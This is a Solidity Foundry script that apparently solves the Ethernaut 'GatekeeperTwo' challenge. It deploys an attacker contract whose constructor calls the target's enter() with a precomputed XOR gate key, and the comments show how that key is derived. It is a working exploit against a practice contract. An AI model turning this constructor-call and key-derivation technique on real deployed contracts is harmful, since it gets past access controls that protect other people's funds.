// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { HelperConfig } from "./HelperConfig.s.sol";
import { GatekeeperTwo } from "../src/14_GatekeeperTwo.sol";

contract Attacker {

  GatekeeperTwo challenge;

  constructor(address challengeInstanceAddress) {
    challenge = GatekeeperTwo(challengeInstanceAddress);
    bytes8 gateKey = 0x201BEC2A89131FD8;
    challenge.enter(gateKey);
  }

  // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
  // type(uint64).max == 18446744073709551615;
  // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) == 16133041572692156455;

  // 16133041572692156455 ^ uint64(_gateKey) == 18446744073709551615;

  // 1101111111100100000100111101010101110110111011001110000000100111 ^ 0010000000011011111011000010101010001001000100110001111111011000 (2313702501017395160 decimal o 201BEC2A89131FD8 bytes8) == 1111111111111111111111111111111111111111111111111111111111111111
  
  // attacker address: 0xf88BCD2dA45052e0B2Ca501606f68ae74c312Ff9
}

contract GatekeeperTwoAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {

    HelperConfig helperConfig = new HelperConfig();
    address payable challengeInstanceAddress = payable(helperConfig.instances("GatekeeperTwo"));

    vm.startBroadcast(deployerPrivateKey);
    Attacker attacker = new Attacker(challengeInstanceAddress);
    console.log("Attacker address: %s", address(attacker));
    console.log("Entrant: %s", address(GatekeeperTwo(challengeInstanceAddress).entrant()));
    vm.stopBroadcast();
  }

}